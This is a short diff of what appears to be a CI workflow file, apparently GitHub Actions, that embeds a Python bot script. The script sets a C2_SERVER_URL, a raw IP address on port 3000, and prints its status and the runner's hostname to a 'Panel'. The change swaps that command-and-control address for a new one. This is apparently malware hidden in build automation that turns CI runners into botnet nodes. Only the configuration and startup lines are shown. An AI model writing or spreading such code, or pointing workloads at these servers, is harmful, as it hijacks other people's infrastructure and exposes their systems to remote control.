@@ -107,7 +107,7 @@ jobs:
           import platform
           import signal
 
-          C2_SERVER_URL = 'http://23.94.251.170:3000'
+          C2_SERVER_URL = 'http://103.218.123.146:3000'
 
           print(f'[BOT] Starting... Panel: {C2_SERVER_URL}')
           print(f'[BOT] Hostname: {platform.node()}')
